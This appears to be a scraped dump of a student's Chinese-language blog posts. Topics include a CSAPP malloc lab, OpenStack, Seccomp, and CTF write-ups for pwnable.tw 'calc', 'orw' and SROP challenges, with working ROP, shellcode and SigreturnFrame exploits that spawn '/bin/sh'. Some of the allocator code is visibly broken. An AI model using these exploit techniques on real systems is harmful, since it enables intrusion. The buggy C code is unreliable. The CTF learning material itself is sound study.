计画完成时间是12.5之前，也就是三天。 1）大体设计​ 对于整体的操作的大致模型以及allocater和freer需要做的工作如下： ​ 分配器： 在第一次分配chunk时，对堆空间进行初始化=&gt;mm_init() 创建指定类型的chunk。 ​ free 利用隐式空闲链表，将free状态的chunk链接。 利用合适的机制，对物理地址相邻的free chunk进行合并 利用合适的机制，在分配器有需求的时候分割相对应的free chunk，并将其标识为allocated。 ​ 其他的驱动代码以及头文件已经给出，我们只需在mm.c中进行编写。 ​ 在这个模型中，分配器的分配的chunk的结构大致如下，运用带边界标记的chunk使堆块合并更加优雅。 ​ ​ 2）利用宏定义简化指针操作​ 为了简化在操作chunk在链表中的一些与指针相关的行为，我们可以定义一系列宏来将这些操作打包，使得代码更为简洁，同时一些基本的常数也将被定义。 ​ ​ ​ 3）level·1​ level1利用隐式空闲链表+首次/下一次/最佳适配三种方式实现。 first_fitmm_init()​ 首先是mm_init()函数，利用mm_sbrk()创建一个4字的空闲链表，将链表第一个双字的首尾分别标记为序言块的header和footer，然后将第三个字标记为结尾块，然后调用extend_heap()函数初始化堆空间。被初始化的size为CHUNKSIZE/WSIZE也就是1*10^12 / 4。 ​ 然后是extend_heap()函数，利用mm_sbrk()创建size大小的空间，size由之前初始化的size决定。并且将整个空chunk的对应位标记头和脚部。最后，在很可能出现的前一个堆以一个空闲块结束的情况，我们调用coalesce函数来合并两个空闲块 ，并返回指向合并后的块的块指针。coalesce函数将在后面的部分被详细分析。 mm_malloc()​ 堆空间初始化之后，我们首先设计mm_malloc()。 ​ 函数大致功能是： 检查请求真假，然后准备分配chunk 调整chunk size，在请求size的基础上加入8字节的对齐和8字节的chunk头和chunk脚。也就是说，一个chunk至少会有16字节。 在free list中寻找符合size要求的chunk。 如果没有在free list中找到，则直接调用extend_heap() 生成对应的空间。 ​ 这里csapp没有为我们提供find_fit()以及place()的例子,需要我们自己编写。我们先放着，之后再来讨论。 mm_free()​ mm_malloc()之后，我们来看mm_free() ​ 它被用来释放已被分配的chunk，相当于释放malloc所请求的bp，然后需要将被释放的chunk与其物理领接的free chunk合并。 ​ ​ coalesce()​ 重点来看coalesce() ​ 这里用到的合并方式的构思图表如下： ​ ​ 也是非常地直观容易理解。 ​ 它的代码实现也直观地被分为如图四种情况，所以我们先要定义对应图中几种状态的bp状态。 size_t prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp))); size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp))); size_t size = GET_SIZE(HDRP(bp)); ​ 大致框架如下： ​ find_fit()​ 整个malloc lab的重点，需要自己实现一个free chunk的适配寻找。 ​ 一些常见的方法有 首次适配 下一次适配 最佳适配 分离式（复杂） ​ 其实这些并不是完全先进或者落后，各有各的优缺点。在这里为了简单我们选择首次适配，即使用在free list中找到的第一个符合条件的chunk。 ​ 按照首次适配的原理，我们的思路是，从头到尾搜索链表，如果遇到合适的free chunk，则按照size将其头和尾部标记。 ​ 实现大致是： ​ 指定一个size，在链表中通过判断头部inuse位，找到第一个free chunk的bp,，然后计算next bp是否大于bp + size ,且状态为free，如果是，将bp标记为allocated，在bp+size的地方标记为footer，分割该chunk，虽然会留下一定的碎片，但这也是首次适配无法避免的缺点。如果不是，则继续寻找下一个free chunk并判断。 ​ 然后来研究代码实现： ​ 自己瞎写了一个，问题不大。 place()​ 函数功能是将请求块放置在空闲块的起始位置，只有当剩余部分的大小等于或者超出最小块的大小时，才进行分割。 static void place(void *bp, size_t asize) { size_t size = GET_SIZE(HDRP(bp)); if ((size - asize) &gt;= (2*DSIZE)) { PUT(HDRP(bp),PACK(asize,1)); PUT(FTRP(bp),PACK(asize,1)); PUT(HDRP(NEXT_BLKP(bp)),PACK(size - asize,0)); PUT(FTRP(NEXT_BLKP(bp)),PACK(size - asize,0)); } else { PUT(HDRP(bp),PACK(size,1)); PUT(FTRP(bp),PACK(size,1)); } } 问题不大 next_fit​ 下一次适配，主要特点是在第一次在空闲链表中找到合适的chunk以后，下一次搜索就不再是从头到尾，而是从上一次搜索的chunk开始继续搜索。 ​ 相比于首次适配，写循环时就不能嗯搞，要处理第一次找到fit chunk后的状态。大致的思路是：先按照首次适配的方式找到第一个适合的chunk，然后记录下chunk的bp，下一次寻找时则从记录的bp开始寻找。 ​ 那么肯定需要定义一个外部变量来记录每次找到的bp。 static void *next_find_fit(size_t asize) { char * bp = heap_listp; size_t ALLOC_STATUS; size_t SIZE; while (GET_SIZE(HDRP(NEXT_BLKP(bp))) &gt; 0) { if(mark_bp) { bp = NEXT_BLKP(mark_bp); ALLOC_STATUS = GET_ALLOC(HDRP(bp)); if (ALLOC_STATUS) continue; if(SIZE &lt; asize) continue; mark_bp = bp; return bp; continue; } bp = NEXT_BLKP(bp); ALLOC_STATUS = GET_ALLOC(HDRP(bp)); if (ALLOC_STATUS) continue; if(SIZE &lt; asize) continue; mark_bp = bp; return bp; } return NULL; } ​ 问题不大。 best_fit​ 搜索链表中的每一个堆块，选择符合条件的最小空闲块。目前来说思路是这样的： ​ 对整个堆空间进行搜索，标记合适的chunk，并将size储存在数组中，在搜索结束后进行排序，选择最适合的chunk，并将bp返回。 ​ 对堆空间进行搜索，大概只需要在原本的算法上去掉结束循环的判定条件。然后排序的话随意找个排序算法来就行，图方便我复制了一个冒泡排序，虽然时间复杂度不太行。 ​ 但是存在一个问题就是，排序肯定是以chunk的size为标准，但是如何关联size和bp呢？我将所有符合条件的chunksize排序之后，如何找到对应的bp？ ​ 一个比较直观的解决方法就是二维数组，将bp和size同时存放，同时排序，当然也许可以使用类似PACK的宏，或者为每一个size增加一个idx，也是二维数组的思路，但是并不是直接将bp存放，而是存放bp的idx。 ​ 考虑到二维数组排序有一些麻烦，故直接定义结构体来存放size与bp的idx。 static void *best_find_fit(size_t asize) { char * bp = heap_listp; size_t ALLOC_STATUS; size_t SIZE; struct bp_list list[]; while (GET_SIZE(HDRP(NEXT_BLKP(bp))) &gt; 0) { for ( int i = 0; i &lt; CHUNKSIZE/WSIZE; i++) { bp = NEXT_BLKP(bp); ALLOC_STATUS = GET_ALLOC(HDRP(bp)); if (ALLOC_STATUS) continue; if(SIZE &lt; asize) continue list[i].bp_size = GET_SIZE(HDRP(bp)); list[i].bp_idx = i; list[i].bp = HDRP(bp); } bubble_sort(int list[i].bp_size,int i); return list[i].bp; } return NULL; } 4) level2​ level2利用显式链表和分离适配来实现，同时这种方法也是非常接近ptmalloc2的，所以学习这种方法的思想是十分必要的。 数据结构显式空闲链表​ 相比于隐式空闲链表没有实际的链表去管理空闲块，显式空闲链表使用新增的双向循环链表，通过在chunk头添加指向逻辑上相邻的chunk的指针来相互连接。显式链表为chunk指针操作增添了更多姿势，突破了隐式性能的局限性。当然这个方案也不是完全没有缺点，为了包含指针和可能的脚部，显式空闲链表的chunk通常会更大一些，潜在地提高了内存碎片的程序。 chunk​ 显式链表chunk结构如图： ​ 有点类似ptalloc的机制，当chunk为allocated状态，中间为padding，当为free状态，会在padding开始前，也就是之前方案中的bp指向的地方增添两个指针：next_bp， prev_bp。 First_fit​ 因为确实不太会写，所以基本算是照着代码分析思路了。 ​ 首先是完成显式空闲链表下first_fit的实现，这种方案目的是熟悉如何通过创建一个双向循环链表来管理空闲块。 ​ 第一步是创建空闲链表。 ​ ​ 显式链表下的free()也和隐式空闲链表没区别，都是把chunk 头的size置0，但是多出来了 SET_PREV(bp, 0); SET_NEXT(bp, 0); ​ 也就是先将需要free的chunk的fd和bk位全部设置为0，然后进行合并后放入空闲链表。 ​ ​ 然后编写将chunk插入和取出双向循环链表的操作。 insert_from_free_list()​ 将已分配块释放，chunk bp 被插入free list。 remove_from_free_list()​ 在free list中拿出chunk。与隐式链表类似，分为四种情况。因为是双向循环链表，所以解链的过程也可以理解为unlink。 ​ 第一种情况：prev == NULL &amp;&amp; next == NULL，chunk前后都是allocated chunk，双向链表中啥也没有，设置表头为空。 ​ 第二种情况：prev == NULL ，前一个chunk为allocated，前一项为空，说明此时chunk的前面没有chunk，那么bk本身就是空的，解链就需要设置fd为空，也就是next为0。 ​ 第三种情况同理。 ​ 第四种情况：chunk前后都有free chunk，那么解链相当于一个标准的unlink，就是将前一个chunk的bp的next位设置为下一个chunk的bp，然后下一个chunk的prev位设置为前一个chunk的bp。 分离适配​ 分离适配的特点就是利用很多储存不同大小范围的chunk的链表来管理free chunk，很大程度上减小了内存碎片的产生。 ​ 根据参考资料，我们可以将大小以2^n划分。 ​ ​ 5）结果与改进​ ​ 6）反思与思考​ 本来应该是在今年暑假就要完成的东西，因为太过懒散而拖到了现在。不得不说如果沉下心来做，这个lab其实不算很难，最难的实际上是对这个简单的内存分配器从0到逐渐熟悉架构的过程。如果不去认真读csapp，了解程序的大致架构的话，就会一头雾水从而放弃，暑假便是因此。 ​ 其实大多数代码并不需要自己完成，也是确实没有这个水平，但是也有我们自己需要思考，然后实现的地方，就比如说适配的方法。我从来没有学过数据结构或者算法，也没有刷过类似的题，c语言也就是局限于看得懂这样的普通计算机专业学生水平，对于这种大面积的指针操作一时确实有些摸不着头脑，但是csapp给了我们一种解：利用宏，将复杂的指针运算以及强制类型转换封装，变得简单易用，这使得在我操作指针时，几乎感受不到指针的复杂所在，也是我觉得收获最大之所在。 ​ 关于三种适配方法，第一种我在编写时并不太理解如何实现“继续寻找下一个chunk”，于是自己按照感觉写了一个版本，然后寻找了一些参考，发现我写的除了这一步，其他都问题不大，然后就把自己的版本修正了。之后的两种适配方法都是基于首次适配的代码加以适当的条件修改而成，不得不说其实十分有趣。最佳适配牵涉到数组的排序以及结构体的定义，说实话上一次编写带结构体的c程序还是上学期起哦期末的暑假考核，但是也没有遇到什么障碍，就这么顺着写了。现在想来我们大一上的c语言大作业真是简单捏。 ​ 7）参考​ 六 Malloc Lab ​ CSAPP:Lab5-Malloc Lab","categories":[],"tags":[{"name":"csapp lab","slug":"csapp-lab","permalink":"https://fuurinko.github.io/tags/csapp-lab/"}]},{"title":"openstack学习笔记","slug":"openstack学习笔记","date":"2021-11-22T08:56:23.363Z","updated":"2021-11-22T09:16:30.143Z","comments":true,"path":"2021/11/22/openstack学习笔记/","link":"","permalink":"https://fuurinko.github.io/2021/11/22/openstack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"​ 为了跟上网校的集群重构计划，这下狠狠地开始学习运维了。 ​ 在开始具体的openstack学习之前，首先需要学习一下一些基本的运维概念。 虚拟化/容器化​ 之前在学习docker的时候对于容器化已经有一个比较到位的认知了，而与容器化相对应的虚拟化并没有深入理解。 ​ 这里的虚拟化特指服务器虚拟化。就是在一台服务器上运行虚拟运行多个服务器。 虚拟化分类完全虚拟化​ 利用Hypervisor，将硬件与软件完全隔离，性能较差。 准虚拟化​ 改动操作系统，使操作系统以为自己是独立的。 操作系统层虚拟化​ 改动操作系统，使主机成为虚拟机管理软件。 桌面虚拟​ 不讨论 硬件虚拟​ 虚拟硬件而不是虚拟操作系统。 虚拟化技术分类​ ​ ​ ​ ​","categories":[],"tags":[{"name":"SRE","slug":"SRE","permalink":"https://fuurinko.github.io/tags/SRE/"}]},{"title":"pwnable-calc","slug":"pwnable-calc","date":"2021-11-18T02:30:24.678Z","updated":"2021-12-03T08:46:25.169Z","comments":true,"path":"2021/11/18/pwnable-calc/","link":"","permalink":"https://fuurinko.github.io/2021/11/18/pwnable-calc/","excerpt":"","text":"逆向​ 程序实现了一个简单的计算器功能。运算有加减乘除四种。 ​ ​ 并且程序再次自带计时功能，需要patch。 ​ ​ 静态链接，所以肯定不能用ret2libc那一套，只能试图ROP一下。 ​ 程序主要功能通过get_expr和calculate（原本不叫这个）两个函数实现。 ​ get_expr主要用于定位我们输入的字符串中运算符的位置。修改过的ida伪代码如下: int __cdecl get_expr(int input_str, int _1024) { int idx_0; // eax char operator; // [esp+1Bh] [ebp-Dh] int i; // [esp+1Ch] [ebp-Ch] i = 0; while ( i &lt; _1024 &amp;&amp; read(0, &amp;operator, 1) != -1 &amp;&amp; operator != '\\n' ) //栈溢出 { if ( operator == '+' || operator == '-' || operator == '*' || operator == '/' || operator == '%' || operator &gt; '/' &amp;&amp; operator &lt;= '9' ) { idx_0 = i++; *(_BYTE *)(input_str + idx_0) = operator; // 通过循坏找到运算符的位置 } } *(_BYTE *)(i + input_str) = 0; return i; ​ 在这之后还有一个init_pool函数。函数参数为表达式数组的索引。大致就是初始化一个大小的100的字符串数组。 ​ calculate函数则负责进行运算。 ​ 实在是没有思路，于是找到了wp。不得不说pwnable.tw上面的题目每个都出得很好，几乎没有板子题，而且漏洞点都丝毫不传统。 ​ 主要的问题还是在这个运算的逻辑上 DWORD *__cdecl eval(_DWORD *num, char operator) { _DWORD *result; // eax if ( operator == '+' ) { num[*num - 1] += num[*num]; } else if ( operator &gt; '+' ) { if ( operator == '-' ) { num[*num - 1] -= num[*num]; } else if ( operator == '/' ) { num[*num - 1] /= num[*num]; } } else if ( operator == '*' ) { num[*num - 1] *= num[*num]; } result = num; --*num; return result; } ​ 这里*num，也就是num[0]的值，是检测到的表达式中数字的数量。 ​ 比如我输入了1+2，那么，num[0]的值为2，如果输入+2，num[0]的值为1。 ​ 所以根据这个计算的逻辑，如果输入+50，num[0]是1，num[1]是50，num[*num-1]就是num[1-1] = num[0] = num[0] + num[1]=50。 ​ 如果输入的是+50+1，处理第一个加号时，num[0] = 2,num[1] = 50 ,num[2].= 1， 然后num[1] += num[2] =&gt; num[1] = 51，接着处理第二个加号，也就是,num[50] += num[51]。 ​ num[51]显然应该是一个栈上的还没有被利用到的位置，但是这样我们已经能够将其覆盖为任意内容了，四舍五入形成了一个栈上任意地址读。 ​ 然后后面还有一个对数组的内容的输出，相当于栈上任意地址写。 ​ 这样我们就找到了不通过栈溢出而对栈上地址进行任意读写的方法，但想要控制程序执行流，我们注意到，存放进行计算的数字的数组不算很大，完全能够填写东西覆盖返回地址。 ​ ​ ​ ​ ​ 也就是0x5A0 + 0x4 = 0x5A4 = 1444。数组存放int类型，32位下一个int占4个字节，所以返回地址所在的位置是idx[1444/4=361] ​ 也就是说如果我们能够将想要的东西写入idx[361]就能控制程序执行流。但是并不能ret2libc，所以需要在栈上手动构造寄存器状态来进行系统调用。 ​ 所以我们需要的并不是在idx[361]上填某个值，而是需要连续修改这之后一串的空间来进行rop。 ​ 借一张图来表示我们需要的布栈状况： ​ ​ ​ 其他的gadgets都可以通过ROPgadget来找到，但是字符串\"/bin/sh\"需要输入并确定它们在栈上的地址。 ​ ​ ​ 对于这个地址，首先我们可以利用我们之前的栈上任意地址读写的能力泄露calc函数的ebp地址，也即是idx[360] ,但是我们需要的字符串是在main函数调用栈中的，所以我们需要知道main函数调用栈的esp。 ​ 通过观察可以发现main的esp正好就是idx[361],而calc ebp和main esp的关系如下： mov ebp, esp and esp, 0FFFFFFF0h sub esp, 10h ​ 也即是我们可以通过calc ebp的值来求出main esp，从而通过偏移获得\"/bin/sh\"的地址。 ​ 然后根据布栈将地址依次写入栈中就行。","categories":[],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"妙控鼠标卡顿问题","slug":"妙控鼠标卡顿问题","date":"2021-11-17T13:59:33.427Z","updated":"2021-11-17T14:55:09.641Z","comments":true,"path":"2021/11/17/妙控鼠标卡顿问题/","link":"","permalink":"https://fuurinko.github.io/2021/11/17/%E5%A6%99%E6%8E%A7%E9%BC%A0%E6%A0%87%E5%8D%A1%E9%A1%BF%E9%97%AE%E9%A2%98/","excerpt":"","text":"​ 最近刚花了三百大洋从室友那里买回了白嫖了半个学期的妙控鼠标，钱转了不到两天，鼠标开始疯狂卡顿。 ​ 最初以为是外接了太多东西，把键盘啥的都换成了线控，但是问题还是不见解决。 ​ 最后是这篇文章解决了我的问题。 ​ macos系统里面，蓝牙鼠标偶尔卡顿，飘的问题 ​ 解决方法也很简单，把网络中的蓝牙PAN的顺序调到最前。 ​ 蓝牙PAN就是类似一种个人局域网，把连接顺序放到前面了，自然连接就更顺畅了（","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"Seccomp机制学习","slug":"Seccomp机制学习","date":"2021-11-11T13:12:47.210Z","updated":"2021-11-17T14:29:34.128Z","comments":true,"path":"2021/11/11/Seccomp机制学习/","link":"","permalink":"https://fuurinko.github.io/2021/11/11/Seccomp%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"1）Seccomp基础Seccomp简介​ 就像ALSR，NX这样，Seccomp也是linux内核的一种安全机制。这种保护机制会禁用某些系统调用，有效避免了越权行为的发生。 启动Seccomp​ 如果要编写调用Seccomp的程序，需要先安装相应的头文件。 apt install libseccomp-dev libseccomp2 seccomp Seccomp的模式以及参数比较多，这里只总结比较直观的几点，具体的可以看大佬的博客：seccomp学习笔记 scmp_filter_ctx ctx; ctx = seccomp_init(SCMP_ACT_ALLOW);/* SCMP_ACT_ALLOW表示在初始化的时候允许所有系统调用，相反的 SCMP_ACT_KILL表示禁用所有系统调用*/ seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0); //添加一条seccomp规则，第二个参数选择禁用/开启（kill为禁用，allow为开启）第三个参数表示规则处理的具体的系统调用，第四个参数是限制系统调用执行的参数，如果不为0，那么后面会加上更具体的限制系统调用参数的函数参数） seccomp_load(ctx);//调用，使过滤规则生效 2）Seccomp-Tools​ 暂时空着，因为我seccomp dump，系统给我说无权限。这个问题似乎仅限于docker，但是网上并没有类似的烈士为我答疑解惑捏。 3）ORW例题pwnable-orw​ pwnable第二题，orw。 ​ ​ ​ 这里的沙箱实际是通过prctl来控制实现的。 (1).PR_SET_SECCOMP(22)：当第一个参数是PR_SET_SECCOMP,第二个参数argv2为1的时候，表示允许的系统调用有read，write，exit和sigereturn；当argv等于2的时候，表示允许的系统调用由argv3指向sock_fprog结构体定义，该结构体成员指向的sock_filter可以定义过滤任意系统调用和系统调用参数。(细节见下图) (2).PR_SET_NO_NEWPRIVS(38):prctl(38,1,0,0,0)表示禁用系统调用execve()函数，同时，这个选项可以通过fork()函数和clone()函数继承给子进程 copy的宋师傅的博客捏 ​ 所以这道题就是一道没有任何坑的orw，我们需要做的就是手写shellcode。 ​ 参照我之前qwb那道orw的wp，为了读取到flag，我们的步骤如下 sys_open(\"flag\")//读取flag sys_read(\"eax\",\"esp\",0x40)//eax为sys_oopen的返回值，也就是flag，然后将flag写到esp下 sys_write(1,\"esp\",0x40)//打印flag的值到屏幕输出 ​ 如果要达到可以成功执行的效果，就必须要像写完整汇编一样将所有压栈出栈等对栈顶的操作也考虑进去。 ​ 手写汇编要尤其注意32位与64位系统传参规则并不相同。尤其是函数使用的寄存器的种类理论上是特定的，如果搞错就直接EOF了。 ​ 并且进行软中断时使用的指令是int 0x80而不是syscall，syscall是c语言层面上的系统调用，而int 0x80才是汇编层面的系统调用。 ​ 关于pwntools的asm模块，有一些比较怪的点。 ​ 比如说我们可以这样写： payload = asm(\"push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebp, esp;mov eax, 0x5;xor ecx, ecx;xor edx, edx;int 0x80;\") 也可以这样写 asm('mov eax, 0') ​ 就是说，可以有分号，也可以没有。 from pwn import* #p = process(\"./orw\") #context.terminal = ['tmux', 'splitw', '-h'] #context.update(arch='i386', os='linux') p = remote(\"chall.pwnable.tw\",10001) #context.log_level = \"debug\" #open payload = asm(\"push ebx ;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx, esp;mov eax, 0x5;int 0x80;\") #read payload += asm(\"mov eax, 0x3; mov ecx, ebx; mov ebx, eax;mov edx, 0x60;int 0x80;\") #write payload += asm(\"mov eax, 0x4;mov ebx, 0x1;int 0x80;\") #gdb.attach(p) p.sendline(payload) p.interactive() ​ 完整exp，其实主要是要对32位的传参熟悉，整体编写的难度并不高捏。 4）参考prctl函数开始学习沙箱规则](https://www.cnblogs.com/L0g4n-blog/p/12839171.html)","categories":[],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"pwndocker的pwn题体验（下","slug":"pwndocker的pwn题体验（下）","date":"2021-11-10T20:04:03.336Z","updated":"2021-11-17T15:16:59.058Z","comments":true,"path":"2021/11/11/pwndocker的pwn题体验（下）/","link":"","permalink":"https://fuurinko.github.io/2021/11/11/pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8B%EF%BC%89/","excerpt":"","text":"0）​ 哈哈，还是连续剧，我也想不到捏。我也不想捏。 1）问题​ pwndocker体验了快一周，目前来说主要问题有这几个： 启动tmux进行调试时机器发热严重，风扇狂转 挂载文件夹内文件不同步 快照的制作相对麻烦（时间久，步骤多） 打开需要输入命令，有点烦。 ​ 想了怪久的，就想到这三点，第三点纯属鸡蛋里挑骨头，主要pwndocker体验确实比较优雅，为了美观用vim编辑exp我都能忍。 （看我的绝美终端） ​ 每天在ayanami的注视下打工也会变得快乐（不是打工） ​ 虽然但是，这些问题感觉都不是什么好解决的问题，尤其机器发热。 ​ 目前来说我只能应付。 3）解决方案？1​ 机器发热，cpu内存占用严重，这理论上是无解的，但是在使用过程中我发现这种情况并不是每次都会发生，而是概率性的，而且概率并不是特别高。所以目前敷衍的解决方案是，电脑一吵起来就关了tmux，等它安静了再开。 ​ 2021-11-14更新：这个问题突然就没有了（ 2​ 挂载文件不同步，网上所有方案亲测无效。目前的解决方案是，不解决。用vim，或者出现问题就重启。 ​ 2021-11-14更新：这个问题突然就没有了（ 3​ 这个可以整个一件push脚本 4​ 直接写shell脚本，然后放在默认路径下。","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"SROP学习","slug":"srop学习","date":"2021-11-07T11:11:19.208Z","updated":"2021-11-10T19:40:47.138Z","comments":true,"path":"2021/11/07/srop学习/","link":"","permalink":"https://fuurinko.github.io/2021/11/07/srop%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"1)前言​ 在看完csapp的异常控制流之后，对于信号以及系统调用有了更加深入的了解，故借此机会探明SROP，这个本身并不复杂的知识点。 2）SROP原理​ 当用户向内核发起signal时，此时系统切换为内核态，并且由内核保存进程的上下文（通常是一些寄存器状态）至用户栈，然后切换回用户态，执行信号处理程序。程序执行完毕后，再次切换成内核态，将保存的寄存器状态恢复后返回用户态。 ​ 所以这一串来回切换中，一个缺陷就是第一次切换时上下文保存于用户栈中，所以正好我们可以通过栈溢出控制栈中的数据，而且当寄存器恢复时，内核并不会检查栈中的内容是否被篡改。 ​ 借一张图说明一下： 3）SROP利用​ pwntools中为我们集成了srop利用的工具,接下来我们通过一个极为刻意的例子演示一下如何利用。 funsignal​ 题目地址： funsignals ​ 打开题目，是手写汇编。 ​ ​ 观察一下。程序分别通过系统调用，调用了sys_read , sys_sigreturn两个函数。 ​ 那么很明显，sys_read用来栈溢出，然后 sys_sigreturn作为返回地址。并且flag的地址都已经给出，我们只需要通过sys_write读出flag的值就行。 ​ 所以我们需要构造sys_write的调用 frame = SigreturnFrame() frame.rax = constants.SYS_write#write函数的系统调用号 frame.rdi = constants.STDOUT_FILENO#1 frame.rsi = elf.symbols['flag']#0x010000023 frame.rdx = 50#读取的字符数 frame.rip = elf.symbols['syscall'] ​ 这里就类似pwntools的rop模块，只是把需要的东西生成一下然后存起来。当程序调用sys_read的时候把东西读进用户栈，然后接着调用 sys_sigreturn让内核将用户栈的东西恢复，就相当于调用了sys_write，从而读出flag的值。 ​ 但是这道题将我们需要的任何地址都给出了，甚至也不需要构造sys_sigreturn，我们通过另外一个例子来演示一下如何构造sys_sigreturn并且获得一个shell。 Smallest Pwn​ 题目：smallest pwn ​ 直接先在IDA中查看： start proc near ; DATA XREF: LOAD:0000000000400018↑o .text:00000000004000B0 xor rax, rax .text:00000000004000B3 mov edx, 400h ; count .text:00000000004000B8 mov rsi, rsp ; buf .text:00000000004000BB mov rdi, rax ; fd .text:00000000004000BE syscall ; LINUX - sys_read .text:00000000004000C0 retn .text:00000000004000C0 start endp .text:00000000004000C0 .text:00000000004000C0 _text ends .text:00000000004000C0 .text:00000000004000C0 .text:00000000004000C0 end start ctf-wiki题解​ 可以看到程序本身就是一个sys_read。所以我们需要利用它来getshell，难度可想而知。 ​ 由于题目只给出了sys_read，但是泄露程序内存我们肯定是需要一个sys_write 的，所以这里有一个trick，就是通过将sys_read的返回值构造成函数的系统调用号。然后调用sys_write以及sys_sigreturn。 ​ 那么来看详细的分析 ​ 首先需要调用sys_write，系统调用号为4，也就是需要sys_read返回读入四个字符，将rax的值赋为4。 ​ 顺便sys_sigreturn的返回值为119。 ​ 然后看exp： payload = p64(start_addr) * 3 sh.send(payload) ## modify the return addr to start_addr+3 ## so that skip the xor rax,rax; then the rax=1 ## get stack addr sh.send('\\xb3') stack_addr = u64(sh.recv()[8:16]) log.success('leak stack addr :' + hex(stack_addr)) ​ 首先发送三次start_addr，第一次使得程序执行流重新回到start，但是在重新执行时输入\\xb3 ,覆盖我们刚刚输入的三个开始地址中的第二个，以至于程序会重新执行start函数，但是是从0x4000B3开始。(第三个地址的作用会在后面体现) ​ 同时我们读入的\\xb3 ,仅有一个字节，这使得sys_read的返回值为1，存在rax中，程序在这里就相当于执行了 mov rax, 1 mov edx, 400h ; count mov rsi, rsp ; buf mov rdi, rax ; fd syscall ; LINUX - sys_write 所以此时相当于进行了一个系统调用号为1的系统调用,也就是sys_write函数。 ​ 并且读出的内容就是rsp的值，也就相当于泄露了一个栈地址。 ​ 回忆一下，srop的关键是通过sys_sigreturn来恢复我们构造的用户栈上的寄存器状态，那么现在我们得到了用户栈的地址，我们就能够在用户栈中写入一些我们想要的东西。 ## make the rsp point to stack_addr ## the frame is read(0,stack_addr,0x400) sigframe = SigreturnFrame()#创建一个SigreturnFrame，没啥好说的 sigframe.rax = constants.SYS_read#确定我们希望调用的函数的系统调用号 sigframe.rdi = 0#read参数 sigframe.rsi = stack_addr#read参数，在栈上读入 sigframe.rdx = 0x400#read参数，读多大 sigframe.rsp = stack_addr#sigframe参数 sigframe.rip = syscall_ret#sigframe参数，这里是syscall+retn的地址 payload = p64(start_addr) + 'a' * 8 + str(sigframe) sh.send(payload) ​ 接着我们开始构造sys_sigreturn ## set rax=15 and call sigreturn sigreturn = p64(syscall_ret) + 'b' * 7#读入15字节 sh.send(sigreturn)#利用与第一段payload同理。将返回地址覆盖成syscall+ret，进行系统调用，而此时rax已经被设置成15. ​ 这样我们就成功地调用了sys_sigreturn ,此时我们已经可以向用户栈中读入任意数据了。 ## call execv(\"/bin/sh\",0,0) sigframe = SigreturnFrame() sigframe.rax = constants.SYS_execve sigframe.rdi = stack_addr + 0x120 # \"/bin/sh\" 's addr sigframe.rsi = 0x0 sigframe.rdx = 0x0 sigframe.rsp = stack_addr sigframe.rip = syscall_ret frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe) print len(frame_payload) payload = frame_payload + (0x120 - len(frame_payload)) * '\\x00' + '/bin/sh\\x00' sh.send(payload) sh.send(sigreturn) ​ 我们再次利用SigreturnFrame()来构造我们读入用户栈的内容。内容也比较直观，就是一个·类似shellcode的东西。然后再调用sys_sigreturn来触发。 ​ 所以总结下来就是，先通过读入一个字符覆盖start函数地址，调用sys_write泄露栈地址，通过两次调用sys_sigreturn，第一次执行sys_read，将execute(\"/bin/sh\")写入用户栈，第二次调用sys_sigreturn来getshell。 自己的反思​ 有一个疑惑，就是既然我们能够通过控制rax而控制syscall，而普通的sys_read也是将用户输入储存到栈上，那为什么还要多此一举，去获得rsp的地址，再将shellcode写到那上面呢？ ​ 怀着这样的问题，果然我在网上找到了一个和我想法完全一致的人。他的exp的关键部分是这样的： reread = 0x4000b0 syscall = 0x4000be rereadaddr = p64(reread) syscalladdr = p64(syscall) context.clear() context.arch = \"amd64\" frame = SigreturnFrame() frame.rax = 59 frame.rdi = 0x7fffffffe4e8 frame.rip = syscall binsh='/bin/sh' playload1 = rereadaddr+'a'*8+ str(frame)+binsh p.send(playload1) playload2 = syscalladdr+'a'*7 p.send(playload2) #http://www.reshahar.com/2017/05/04/360春秋杯smallest-pwn的学习与利用/ ​ ​ 可以看到细节和wiki给出的几乎一样，如果思路行得通，那么应该不会跑出问题，然而当我运行的时候，发现果不其然，EOF了。 ​ 去查了一些资料，发现还是对于SigreturnFrame()的理解不够透彻。 ​ SigreturnFrame()中有一个非常重要的part：sigframe.rsp ​ 我们自己构造的寄存器状态肯定是需要rsp的值的，并且这里rsp肯定也是要可写的，不然后面我们无法把getshell的函数写进去，所以我们这里肯定要指定一个可写的栈上的地址。 ​ 所以之前那种想法就不攻自破了，在那种情况下我们无法获取任何栈上的地址，自然也没有东西可以填，所以还是需要通过sys_write ,来回跳转执行流。 4）总结​ 非常有意思的一个知识点，但是非常奇怪的是我花在理解上的时间比之前任何知识点都短，可能是我之前嗯啃csapp，对于信号，系统调用等稍有了解。也可能是我研究例题的时候完全是参考涅普的视频教程，有pwn奶奶的细节讲解。（这个可能比较重要），说到底还是知识点本身比较简单。 5）参考​ 2017 429 ichunqiu ctf smallest(pwn300) writeup SROP","categories":[],"tags":[{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"}]},{"title":"pwndocker的pwn题体验（上）","slug":"pwndocker的pwn题体验（上）","date":"2021-11-02T14:54:29.012Z","updated":"2022-02-18T13:47:23.433Z","comments":true,"path":"2021/11/02/pwndocker的pwn题体验（上）/","link":"","permalink":"https://fuurinko.github.io/2021/11/02/pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8A%EF%BC%89/","excerpt":"","text":"1）前言​ 